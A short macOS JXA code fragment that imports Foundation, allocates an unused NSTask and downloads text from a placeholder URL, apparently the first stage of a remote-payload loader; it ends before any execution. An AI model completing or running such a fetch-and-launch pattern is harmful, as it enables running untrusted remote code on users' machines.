ObjC.import('Foundation');
var task = $.NSTask.alloc.init;
var url = $.NSURL.URLWithString('https://example.invalid/p');
var d = $.NSData.dataWithContentsOfURL(url);
var s = $.NSString.alloc.initWithDataEncoding(d, $.NSUTF8StringEncoding);
